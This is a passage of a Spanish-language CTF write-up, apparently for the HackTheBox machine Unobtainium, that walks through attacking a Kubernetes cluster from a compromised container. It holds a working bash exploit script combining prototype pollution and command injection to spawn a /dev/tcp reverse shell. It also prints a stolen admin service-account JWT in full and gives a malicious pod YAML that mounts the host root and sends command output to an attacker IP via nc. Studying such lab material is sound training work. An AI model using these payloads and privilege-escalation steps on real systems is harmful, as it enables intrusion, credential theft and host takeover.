+<p>Donde únicamente nos reporta una versión, pero dando vueltas con ella no logramos nada :’(</p>
+
+<p>En nuestra búsqueda llegamos ahora a <a href="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1">este post</a>, acá juega con la <strong>API</strong> mediante <code>cURL</code> y una herramienta llamada <code>kubectl</code>, que curiosamente el sistema tiene una tarea programa para en caso de encontrarlo, borrarlo:</p>
+
+<pre><code class="language-bash">root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ crontab -l
+* * * * * find / -name kubectl -exec rm {} \;
+</code></pre>
+
+<p>Así que puede ser importante, pero veamos primero lo de <code>cURL</code>:</p>
+
+<p>⚡ (<strong><em><u>Voy a simplificar el output, así que nos quedaremos con que estamos en</u> <code>&lt;devnode&gt;</code></em></strong>)</p>
+
+<pre><code class="language-bash">&lt;devnode&gt;$ curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/kube-system/secrets
+</code></pre>
+
+<p>Pero nos devuelve que no tenemos acceso a ese recurso como nuestro usuario ): peeeeero, ¿y si quitamos <code>secrets</code>?</p>
+
+<pre><code class="language-bash">&lt;devnode&gt;$ curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/kube-system
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_pollutionSH_API_names_kubeSystem.png" alt="338bash_pollutionSH_API_names_kubeSystem" /></p>
+
+<p>Lindo, empezamos a encontrar rutas que nos devuelven algo distinto a <strong>Forbidden</strong>, así que tamos bieeeeen…</p>
+
+<p>Estamos sobre un cluster llamado <code>kube-system</code>, si vamos hacia atras intentando listar los “<a href="https://kubernetes.io/es/docs/concepts/overview/working-with-objects/namespaces/">espacios de nombres</a>” (clusters virtuales) encontramos uno llamativo:</p>
+
+<pre><code class="language-bash">&lt;devnode&gt;$ curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces
+</code></pre>
+
+<pre><code class="language-json">{
+  "kind": "NamespaceList",
+  "apiVersion": "v1",
+  "metadata": {
+    "resourceVersion": "65796"
+  },
+  "items": [
+    {
+      "metadata": {
+        "name": "default",
+    ...
+      "metadata": {
+        "name": "dev",
+    ...
+      "metadata": {
+        "name": "kube-node-lease",
+    ...
+      "metadata": {
+          "name": "kube-public",
+    ...
+      "metadata": {
+          "name": "kube-system",
+...
+</code></pre>
+
+<p>¿Cuál? Pos si, <code>dev</code>:</p>
+
+<pre><code class="language-bash">&lt;devnode&gt;$ curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/dev
+</code></pre>
+
+<p>Pero no vemos nada relevante, simplemente que ese <code>namespace</code> me sonó extraño y podemos tenerlo en cuenta por si algo…</p>
+
+<p>…</p>
+
+<p>Jugando con <a href="https://kubernetes.io/es/docs/tasks/tools/install-kubectl/">kubelet</a> nos es más sencillo movernos, así que siguiendo <a href="https://kubernetes.io/es/docs/tasks/tools/install-kubectl/">esta guía</a> logramos descargarlo, lo subimos a la máquina (recuerden cambiarle el nombre, si no, el sistema lo borra) y empezamos a probar cositas:</p>
+
+<pre><code class="language-bash">root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl http://10.10.14.146:8000/kubectl -o kubito
+</code></pre>
+
+<blockquote>
+  <p><a href="https://kubernetes.io/docs/reference/kubectl/cheatsheet/">Siguiendo este <strong>Cheat Sheet</strong></a> de <strong>kubectl</strong> encontramos el uso de varios comandos.</p>
+</blockquote>
+
+<p>Vamos viendo de manera más sencilla lo que habíamos encontrado con <code>cURL</code>, por ejemplo para ver los “espacios de nombre” simplemente ejecutamos:</p>
+
+<pre><code class="language-bash">root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ ./kubito get namespaces
+NAME              STATUS   AGE
+default           Active   167d
+dev               Active   167d
+kube-node-lease   Active   167d
+kube-public       Active   167d
+kube-system       Active   167d
+</code></pre>
+
+<p>Vemos a <code>dev</code>, que (despues de algunas pruebas) es el unico en el que tenemos “permisos” para leer cositas distintas a los demás:</p>
+
+<blockquote>
+  <p>Validamos lo que podemos hacer contra cada <code>namespace</code>…</p>
+</blockquote>
+
+<p>(Cambiamos <code>-n</code> por cada uno: <strong>default</strong>, <strong>kube-node-lease</strong>, <strong>kube-public</strong> y <strong>kube-system</strong>):</p>
+
+<pre><code class="language-bash">root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ ./kubito auth can-i --list -n default        
+Resources                                       Non-Resource URLs                     Resource Names   Verbs
+selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
+namespaces                                      []                                    []               [get list]
+...
+</code></pre>
+
+<p><strong>En los 4 podemos ver los <code>namespaces</code> (tenemos el mismo output)</strong>, pero con <code>dev</code> podemos listar los <strong>pods</strong>:</p>
+
+<blockquote>
+  <p><strong>Pod</strong> es un grupo de uno (aunque sea uno se le llama grupo) o más contenedores dentro de un <code>namespace</code>.</p>
+</blockquote>
+
+<pre><code class="language-bash">root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ ./kubito auth can-i --list -n dev    
+Resources                                       Non-Resource URLs                     Resource Names   Verbs
+selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
+namespaces                                      []                                    []               [get list]
+pods                                            []                                    []               [get list]
+...
+</code></pre>
+
+<p>Pues echemos un ojo:</p>
+
+<pre><code class="language-bash">root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ ./kubito get pods -n dev    
+NAME                                READY   STATUS    RESTARTS   AGE
+devnode-deployment-cd86fb5c-6ms8d   1/1     Running   28         167d
+devnode-deployment-cd86fb5c-mvrfz   1/1     Running   29         167d
+devnode-deployment-cd86fb5c-qlxww   1/1     Running   29         167d
+</code></pre>
+
+<p>Bien, encontramos 3 <strong>pods</strong>, podemos ver una descripción de cada uno usando <code>describe</code>, por ejemplo veamos la de <code>devnode-deployment-cd86fb5c-6ms8d</code>:</p>
+
+<pre><code class="language-bash">&lt;devnode&gt;$ ./kubito describe pod devnode-deployment-cd86fb5c-6ms8d -n dev
+</code></pre>
+
+<blockquote>
+  <p>Es gigante el output :P</p>
+</blockquote>
+
+<pre><code class="language-yml">Name:         devnode-deployment-cd86fb5c-6ms8d
+Namespace:    dev
+Priority:     0
+Node:         unobtainium/10.10.10.235
+Start Time:   Sun, 17 Jan 2021 18:16:21 +0000
+Labels:       app=devnode
+              pod-template-hash=cd86fb5c
+Annotations:  &lt;none&gt;
+Status:       Running
+IP:           172.17.0.4
+IPs:
+  IP:           172.17.0.4
+Controlled By:  ReplicaSet/devnode-deployment-cd86fb5c
+Containers:              
+  devnode:               
+    Container ID:   docker://d12ba992b0492f26740ce2664c04a232b9324d5f6c745098b1375682fd16b6c3
+    Image:          localhost:5000/node_server
+    Image ID:       docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c
+    Port:           3000/TCP
+    Host Port:      0/TCP
+    State:          Running
+      Started:      Fri, 02 Jul 2021 05:41:11 +0000
+    Last State:     Terminated
+      Reason:       Error
+      Exit Code:    137
+      Started:      Wed, 24 Mar 2021 16:01:28 +0000
+      Finished:     Wed, 24 Mar 2021 16:02:13 +0000
+    Ready:          True
+    Restart Count:  28
+    Environment:    &lt;none&gt;
+    Mounts:
+      /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro)
+Conditions:
+  Type              Status
+  Initialized       True
+  Ready             True
+  ContainersReady   True
+  PodScheduled      True
+Volumes:
+  default-token-rmcd6:
+    Type:        Secret (a volume populated by a Secret)
+    SecretName:  default-token-rmcd6
+    Optional:    false
+QoS Class:       BestEffort
+Node-Selectors:  &lt;none&gt;
+Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
+                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
+Events:          &lt;none&gt;
+</code></pre>
+
+<p>(Lo único que cambia entre los 3 es la dirección <strong>IP</strong> en la que están sirviendo:</p>
+
+<pre><code class="language-bash">* devnode-deployment-cd86fb5c-6ms8d : 172.17.0.4
+* devnode-deployment-cd86fb5c-mvrfz : 172.17.0.5
+* devnode-deployment-cd86fb5c-qlxww : 172.17.0.7
+</code></pre>
+
+<p>(Sí, sé lo que puedes estar pensando, tranqui, ya verás)</p>
+
+<p>…</p>
+
+<h2 id="expl-webapp-bash-pollution">Explotando y molestando al contenedor: <u>Prototype Pollution + Command Injection</u> <a href="#expl-webapp-bash-pollution">📌</a></h2>
+
+<p>Leyendo las descripciones con detenimiento (porque es con lo único con lo que podemos jugar) vemos que los contenedores están sirviendo en el puerto <strong>3000</strong> un servidor de node, que después de validar su respuesta recordé nuestra explotación inicial hacia el servidor <strong>node</strong>:</p>
+
+<pre><code class="language-bash">root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl http://172.17.0.4:3000; echo
+[]
+root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl http://172.17.0.5:3000; echo
+[]
+root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl http://172.17.0.6:3000; echo
+curl: (7) Failed to connect to 172.17.0.6 port 3000: Connection refused
+root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl http://172.17.0.7:3000; echo
+[]
+</code></pre>
+
+<p>La respuesta es nada, pero podemos intentar jugar con algún servidor de los 3 que hay para ver si estamos ante el mismo servicio que explotamos anteriormente (node), para esto mandemos un mensaje (como los que ya hicimos), solo que acá debemos usar <code>cURL</code>:</p>
+
+<p>Juguemos con <code>http://172.17.0.5:3000</code>:</p>
+
+<pre><code class="language-bash">&lt;devnode&gt;$ curl -s -H 'Content-Type: application/json' -X PUT -d '{"auth":{"name":"felamos","password":"Winter2021"},"message":{"text":"holaaaaa"}}' http://172.17.0.5:3000
+{"ok":true}
+</code></pre>
+
+<p>Al parecer nos dejó, por lo que vamos tirando a que efectivamente es el mismo servicio, comprobemos que se subió el mensaje:</p>
+
+<pre><code class="language-bash">root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl http://172.17.0.5:3000; echo
+[{"icon":"__","text":"holaaaaa","id":1,"timestamp":1625437769543,"userName":"felamos"}]
+</code></pre>
+
+<p>Perfecto, pues estamos ejecutando el mismo servicio de antes (:</p>
+
+<blockquote>
+  <p><strong>Perdi mucho tiempo al no centrarme en esto, es claro el <em>path</em> pero en su momento no lo vi :P</strong></p>
+</blockquote>
+
+<p>Seguí enumerando y enumerando y nada, full perdido, así que me fui a buscar ayuda, esta fue la pista:</p>
+
+<blockquote>
+  <p>“Piensa en <code>webapp</code> como <code>devnode</code>“…</p>
+</blockquote>
+
+<p>Dando vueltas con ella caí en cuenta de algo al mirar la terminal y al leer lo que habíamos hecho hace un momento con <code>cURL</code> y el servidor node:</p>
+
+<pre><code class="language-bash">root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$
+</code></pre>
+
+<p><strong>webapp-deployment</strong> esta en nuestro hostname yyyyyyy si miramos la descripción de algún <strong>pod</strong> vemos <strong>devnode-deployment</strong> en su nombre, podemos pensar que estamos situados en algún contenedor del <strong>pod</strong> que encierra a la aplicación web (<code>webapp</code>), por lo que si existen otros contenedores que (según su nombre) hacen referencia a entornos de desarrollo (<code>devnode</code>), probablemente debamos movernos a alguno de ellos :o APAAAA, entiendo tu PISTAAAaaAAAAa.</p>
+
+<p>Peeeeero ¿y como nos movemoooooooos? :(</p>
+
+<p>Pues acá entra en juego lo que habíamos probado con <code>cURL</code> y los servidores node internos, ya que ellos están sirviendo desde contenedores llamados <code>devnode-deployment...</code> y nosotros estamos sobre contenedores llamados <code>webapp-deployment...</code>. Por lo que simplemente deberíamos volver a ejecutar nuestra explotación, pero contra algún servidor <strong>node</strong> interno (:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_gif_woooooow.gif" style="display: block; margin-left: auto; margin-right: auto; width: 60%;" /></p>
+
+<p>Podemos crear un script en <code>bash</code> que nos haga la gestión muuuucho más rápido y sea estético, así evitamos tener que estar limpiando la terminal por culpa de los comandos <code>cURL</code> tan largos :P (además de practicar nuestro scripting en bash).</p>
+
+<pre><code class="language-bash">#!/bin/bash
+
+# CTRL + C
+function ctrl_c() {
+    echo "s4l1eNdo..."
+}
+trap ctrl_c INT
+
+# ---- Funciones del programa
+
+todo_data() {
+    cat &lt;&lt;EOF
+    {
+        "auth": {
+            "name": "felamos",
+            "password": "Winter2021"
+        },
+        "filename": "todo.txt"
+    }
+EOF
+}
+
+upload_data() {
+    cat &lt;&lt;EOF
+    {
+        "auth": {
+            "name": "felamos",
+            "password": "Winter2021"
+        },
+        "filename": "&amp; bash -c 'bash &gt;&amp; /dev/tcp/$1/$2 0&gt;&amp;1'"
+    }
+EOF
+}
+
+message_data() {
+    cat &lt;&lt;EOF
+    {
+        "auth": {
+            "name": "felamos",
+            "password": "Winter2021"
+        },
+        "message": {
+            "text": "holadenuevorey",
+            "__proto__": {
+               "canUpload": "true"
+            }
+        }
+    }
+EOF
+}
+
+# ---- Variables globales
+
+URL="$1"
+IP="$2"
+PORT="$3"
+
+# ---- Inicio del programa
+
+if [ -z $URL ] || [ -z $IP ] || [ -z $PORT ]; then
+    echo -e "\n[!] Uso: $0 http://node_server lhost lport"
+    echo -e "Ejemplo: $0 http://10.10.10.235:31337 10.10.14.146 4433\n"
+    exit 1
+else
+    # Asignamos objeto `canUpload`
+    curl -s -H "Content-Type: application/json" -X PUT -d "$(message_data)" $URL &gt; /dev/null
+
+    # Subimos archivo con comando
+    curl -s -H "Content-Type: application/json" -X POST -d "$(upload_data $IP $PORT)" $URL/upload &gt; /dev/null
+    echo -e "\n[+] Reverse Shell Generada!!\n"
+fi
+</code></pre>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/unobtainium/insidePollutionRCE.sh">insidePollutionRCE.sh</a></p>
+</blockquote>
+
+<p>Les dejo el script por si quieren jugar con él, la explotación es totalmente igual a la que hicimos, solo que en este caso jugamos con instrucciones de <code>bash</code>.</p>
+
+<blockquote>
+  <p><strong>Tienen que validar que la IP que pongan exista, ya que se generan aleatoriamente y pueda que antes de un reset exista la <code>172.17.0.5</code> pero después no.</strong></p>
+</blockquote>
+
+<p>(El script genera de una vez una <strong>Reverse Shell</strong>)</p>
+
+<p>Lo movemos a la máquina, nos ponemos en escucha y ejecutamos de nuevo contra el servidor <code>http://172.17.0.5:3000</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_devnodeSH_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>PERFECTISIMOOOOOOOOOOOOOOOOOOOOOOO, tamos ahora en uno de los contenedores del <strong>pod</strong> <code>dev</code>, que lindura :3</p>
+
+<p>…</p>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h1>
+
+<p>…</p>
+
+<h2 id="lateral-tokenadmin-found">Encontramos token -secreto- del <u>admin</u> y obtenemos interacción total con <u>Kubernetes</u> <a href="#lateral-tokenadmin-found">📌</a></h2>
+
+<p>Enumerando el sistema no encontramos nada distinto a los contenedores de <code>webapp</code>…</p>
+
+<p>Contamos de nuevo con los archivos para hablar con la API**:</p>
+
+<pre><code class="language-bash">root@devnode-deployment-cd86fb5c-mvrfz:/var/run/secrets/kubernetes.io/serviceaccount$ ls  
+ca.crt  namespace  token
+</code></pre>
+
+<p>Así que podemos intentar ver si ahora tenemos algún permiso distinto o si descartamos que sea por acá.</p>
+
+<p>En vez de jugar con <code>cURL</code> subamos “<code>kubito</code>” que ya sabemos que vamos a obtener la misma info pero con un output más estético :D</p>
+
+<pre><code class="language-bash">root@devnode-deployment-cd86fb5c-mvrfz:/tmp/testao$ curl http://10.10.14.146:8000/kubectl -o kubito
+</code></pre>
+
+<p>Jugando, jugando y jugando encontramos algo destino al probar de nuevo el subcomando <code>auth can-i</code> contra el <strong>namespace</strong> <code>kube-system</code>:</p>
+
+<pre><code class="language-bash">root@devnode-deployment-cd86fb5c-mvrfz:/tmp/testao$ ./kubito auth can-i --list -n kube-system
+Resources                                       Non-Resource URLs                     Resource Names   Verbs
+selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
+secrets                                         []                                    []               [get list]
+...
+</code></pre>
+
+<p>Podemos listar secretos de ese <strong>nombre de espacio</strong>…</p>
+
+<p>🛳️ <strong><em><code>Secret</code>: This is the place to store secret data like passwords, API keys, creds, etc. encoded in B64.</em></strong> <a href="https://book.hacktricks.xyz/pentesting/pentesting-kubernetes#kubernetes-secrets">hacktricks</a>.</p>
+
+<p>Perfecto, para listarlos podemos apoyarnos del subcomando <code>get secrets</code>:</p>
+
+<pre><code class="language-bash">root@devnode-deployment-cd86fb5c-mvrfz:/tmp/testao$ ./kubito get secrets -n kube-system       
+NAME                                             TYPE                                  DATA   AGE
+attachdetach-controller-token-5dkkr              kubernetes.io/service-account-token   3      169d
+bootstrap-signer-token-xl4lg                     kubernetes.io/service-account-token   3      169d
+c-admin-token-tfmp2                              kubernetes.io/service-account-token   3      168d
+certificate-controller-token-thnxw               kubernetes.io/service-account-token   3      169d
+clusterrole-aggregation-controller-token-scx4p   kubernetes.io/service-account-token   3      169d
+coredns-token-dbp92                              kubernetes.io/service-account-token   3      169d
+cronjob-controller-token-chrl7                   kubernetes.io/service-account-token   3      169d
+daemon-set-controller-token-cb825                kubernetes.io/service-account-token   3      169d
+default-token-l85f2                              kubernetes.io/service-account-token   3      169d
+deployment-controller-token-cwgst                kubernetes.io/service-account-token   3      169d
+disruption-controller-token-kpx2x                kubernetes.io/service-account-token   3      169d
+endpoint-controller-token-2jzkv                  kubernetes.io/service-account-token   3      169d
+endpointslice-controller-token-w4hwg             kubernetes.io/service-account-token   3      169d
+endpointslicemirroring-controller-token-9qvzz    kubernetes.io/service-account-token   3      169d
+expand-controller-token-sc9fw                    kubernetes.io/service-account-token   3      169d
+generic-garbage-collector-token-2hng4            kubernetes.io/service-account-token   3      169d
+horizontal-pod-autoscaler-token-6zhfs            kubernetes.io/service-account-token   3      169d
+job-controller-token-h6kg8                       kubernetes.io/service-account-token   3      169d
+kube-proxy-token-jc8kn                           kubernetes.io/service-account-token   3      169d
+namespace-controller-token-2klzl                 kubernetes.io/service-account-token   3      169d
+node-controller-token-k6p6v                      kubernetes.io/service-account-token   3      169d
+persistent-volume-binder-token-fd292             kubernetes.io/service-account-token   3      169d
+pod-garbage-collector-token-bjmrd                kubernetes.io/service-account-token   3      169d
+pv-protection-controller-token-9669w             kubernetes.io/service-account-token   3      169d
+pvc-protection-controller-token-w8m9r            kubernetes.io/service-account-token   3      169d
+replicaset-controller-token-bzbt8                kubernetes.io/service-account-token   3      169d
+replication-controller-token-jz8k8               kubernetes.io/service-account-token   3      169d
+resourcequota-controller-token-wg7rr             kubernetes.io/service-account-token   3      169d
+root-ca-cert-publisher-token-cnl86               kubernetes.io/service-account-token   3      169d
+service-account-controller-token-44bfm           kubernetes.io/service-account-token   3      169d
+service-controller-token-pzjnq                   kubernetes.io/service-account-token   3      169d
+statefulset-controller-token-z2nsd               kubernetes.io/service-account-token   3      169d
+storage-provisioner-token-tk5k5                  kubernetes.io/service-account-token   3      169d
+token-cleaner-token-wjvf9                        kubernetes.io/service-account-token   3      169d
+ttl-controller-token-z87px                       kubernetes.io/service-account-token   3      169d
+</code></pre>
+
+<p>Listos, tenemos varios secretos, si nos fijamos en la columna <code>TYPE</code> nos indica que todos son <a href="https://kubernetes.io/docs/concepts/configuration/secret/#service-account-token-secrets">kubernetes.io/service-account-token</a>, que buscando un poco por la web entendemos que su contenido será siempre un <a href="https://jwt.io/introduction"><strong>JSON Web Token</strong></a>, o sea, con los que ya hemos tratado:</p>
+
+<pre><code class="language-bash">(/run/secrets/kubernetes.io/serviceaccount/token)
+</code></pre>
+
+<p>Entre toooda la lista vemos algunos con nombre llamativo, pero hay dos que destacan:</p>
+
+<pre><code class="language-`bash">* root-ca-cert-publisher-token-cnl86
+* c-admin-token-tfmp2
+</code></pre>
+
+<p>Despues de algunas pruebas (que ya veremos) nos quedamos con <code>c-admin-token-tfmp2</code>, veamos su contenido:</p>
+
+<p>(Estoy en otro hostname, pero no importa, estamos en unos de los containers del <strong>pod</strong> <code>devnode</code> igualmente).</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_devnodeSH_kubito_secret_admin.png" alt="338bash_devnodeSH_kubito_secret_admin" /></p>
+
+<p>Bien, una prueba que me llego a la cabeza fue intentar crear un <strong>pod</strong> con nuestro token actual (<code>/run/secrets/kubernetes.io/serviceaccount/token</code>), el token del secreto <code>root-ca-cert-publisher-token-cnl86</code> y el token del secreto <code>c-admin-token-tfmp2</code>, esta fue la razón por la que me quede con el token <code>c-admin-token-tfmp2</code>:</p>
+
+<pre><code class="language-bash">&lt;devnode&gt;$ TOKEN=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow
+</code></pre>
+
+<p>Tomando algunos ejemplos (como el de <a href="https://book.hacktricks.xyz/pentesting/pentesting-kubernetes/enumeration-from-a-pod#escaping-from-the-pod">hacktricks</a> (cambiamos a <code>namespace: kube-system</code>)) generamos nuestro archivo <code>.yaml</code> y después para validar si podemos crearlo ejecutaríamos:</p>
+
+<pre><code class="language-bash">&lt;devnode&gt;$ ./kubito apply -f aaa.yaml -n kube-system       
+Error from server (Forbidden)
+...
+</code></pre>
+
+<p>Pero indicándole el token:</p>
+
+<pre><code class="language-bash">&lt;devnode&gt;$ ./kubito apply -f aaa.yaml -n kube-system --token $TOKEN        
+pod/attacker-pod created
+</code></pre>
+
+<p>Listoneeeeees, al parecer tenemos el token del usuario <code>admin</code>, lo que quiere decir que tenemos interacción total contra <strong>Kubernetes</strong>, pues ahora solo nos queda probar y probar cosas para ver con cuál logramos explotar esta locura (:</p>
+
+<p>…</p>
+
+<p>Después de muchas pruebas en las que no estaba pensando, solo probaba y probaba (algo sin sentido :s), frene, mire la terminal y empece a pensar sobre lo que estaba intentando crear.</p>
+
+<p>Hubo varios recursos que use para probar, se los dejo por si algo:</p>
+
+<ul>
+  <li><a href="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1">Kubernetes Pentest Methodology Part 1</a>.</li>
+  <li><a href="https://book.hacktricks.xyz/pentesting/pentesting-kubernetes/enumeration-from-a-pod#escaping-from-the-pod">Escaping from the pod</a>.</li>
+  <li><a href="https://www.cyberark.com/resources/threat-research-blog/eight-ways-to-create-a-pod">Eight Ways to Create a Pod</a>.</li>
+  <li><a href="https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation">Bad Pods: Kubernetes Pod Privilege Escalation</a>.</li>
+  <li>Y otros que perdi en el camino pensando que no me servian (pero estoy casi seguro que si).</li>
+</ul>
+
+<p>Y finalmente este:</p>
+
+<ul>
+  <li><a href="https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/">Attacking Kubernetes through Kubelet</a>.</li>
+</ul>
+
+<blockquote>
+  <p>Me quedo con este ultimo porque es sencillo de leer y además fue con el que me pare a pensar sobre que estaba haciendo y con el que finalmente logre crear cositas maliciosas…</p>
+</blockquote>
+
+<p>…</p>
+
+<h2 id="malicious-pod">Generamos <u>POD malicioso</u> <a href="#malicious-pod">📌</a></h2>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_access2THEnodes.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Ese archivo <code>.yaml</code> genera un <strong>pod</strong> que cuando se crea nos devuelve una <strong>Reverse Shell</strong> (además de montar la raíz del sistema (<code>/</code>) en una ruta llamada <code>/host</code>).</p>
+
+<p>Sencillito, nos copiamos ese texto y creamos el archivo <code>.yaml</code> con nuestros comandos, para confirmar que el sistema <strong>host</strong> tiene <code>nc</code>, vamos a decirle que nos envíe el resultado del comando <code>id</code> a nuestro listener:</p>
+
+<pre><code class="language-yml">apiVersion: v1
+kind: Pod
+metadata:
+  name: test
+spec:
+  containers:
+  - name: busybox
+    image: busybox:1.29.2
+    command: ["/bin/sh"]
+    args: ["-c", "id | nc 10.10.14.146 4435"]
+    volumeMounts:
+    - name: host
+      mountPath: /host
+  volumes:
+  - name: host
+    hostPath:
+      path: /
+      type: Directory
+</code></pre>
+
+<p>Ahora le indicamos que nos cree el <strong>pod</strong> según el contenido del archivo <code>.yaml</code>:</p>
+
+<pre><code class="language-bash">&lt;devnode&gt;$ ./kubito -n kube-system --token $TOKEN apply -f aaa.yaml 
+pod/test created
+</code></pre>
+
+<p>Validamos si se creó:</p>
+
+<pre><code class="language-bash">&lt;devnode&gt;$ ./kubito -n kube-system --token $TOKEN get pods
+NAME                                  READY   STATUS             RESTARTS   AGE
+...
+test                                  0/1     ErrImagePull       0          6s
+</code></pre>
+
+<p>Pero hay errores, si volvemos a validar el sistema lo termina y después lo borra:</p>
+
+<pre><code class="language-bash">&lt;devnode&gt;$ ./kubito -n kube-system --token $TOKEN get pods
+NAME                                  READY   STATUS             RESTARTS   AGE
+...
+test                                  0/1     Terminating        0          8s
+</code></pre>
+
+<p>Por lo tanto no se ejecuta nuestro comando… Acá estuve un buen rato, <strong>probando y probando</strong>. (Muchas pruebas e.e)</p>
+
+<p>Se me dio por leer los <strong>pods</strong> que ya existen y comparar algunos campos con los de nuestro archivo <code>.yaml</code> a ver si era que necesitábamos algo en especial, si los listamos vemos varios:</p>
+
+<pre><code class="language-bash">&lt;devnode&gt;$ ./kubito -n kube-system --token $TOKEN get pods
+NAME                                  READY   STATUS             RESTARTS   AGE
+backup-pod                            0/1     CrashLoopBackOff   93         168d
+coredns-74ff55c5b-sclll               1/1     Running            31         169d
+etcd-unobtainium                      1/1     Running            0          117m
+kube-apiserver-unobtainium            1/1     Running            0          117m
+kube-controller-manager-unobtainium   1/1     Running            34         169d
+kube-proxy-zqp45                      1/1     Running            31         169d
+kube-scheduler-unobtainium            1/1     Running            31         169d
+storage-provisioner                   1/1     Running            63         169d
+</code></pre>
+
+<p>Leyendo el contenido del primer <strong>pod</strong> (que esta como en algún tipo de error, pero no se borra (además su nombre el llamativo)) y comparando sus campos con los nuestros podemos copiar algún que otro contenido:</p>
+
+<pre><code class="language-bash">root@devnode-deployment-cd86fb5c-mvrfz:/tmp/testea$ ./kubito -n kube-system --token $TOKEN describe pod backup-pod
+Name:         backup-pod
+Namespace:    kube-system
+Priority:     0
+Node:         unobtainium/10.10.10.235
+Start Time:   Mon, 18 Jan 2021 16:34:56 +0000
+Labels:       &lt;none&gt;
+Annotations:  &lt;none&gt;
+Status:       Running
+IP:           172.17.0.9
+IPs:
+  IP:  172.17.0.9
+Containers:
+  backup-pod:
+    Container ID:   docker://64a32a185ef0b218ddaaddb376725f3f709c7cc36b4f5872ebdf179819d189f4
+    Image:          localhost:5000/dev-alpine
+    Image ID:       docker-pullable://alpine@sha256:d9a7354e3845ea8466bb00b22224d9116b183e594527fb5b6c3d30bc01a20378
+    Port:           &lt;none&gt;
+    Host Port:      &lt;none&gt;                                                                      
+    State:          Waiting         
+      Reason:       CrashLoopBackOff
+    Last State:     Terminated
+      Reason:       Completed
+      Exit Code:    0
+      Started:      Mon, 05 Jul 2021 19:53:36 +0000
+      Finished:     Mon, 05 Jul 2021 19:53:36 +0000
+    Ready:          False
+    Restart Count:  94
+    Environment:    &lt;none&gt;
+    Mounts:
+      /var/run/secrets/kubernetes.io/serviceaccount from default-token-l85f2 (ro)
+Conditions:
+  Type              Status
+  Initialized       True 
+  Ready             False 
+  ContainersReady   False 
+  PodScheduled      True
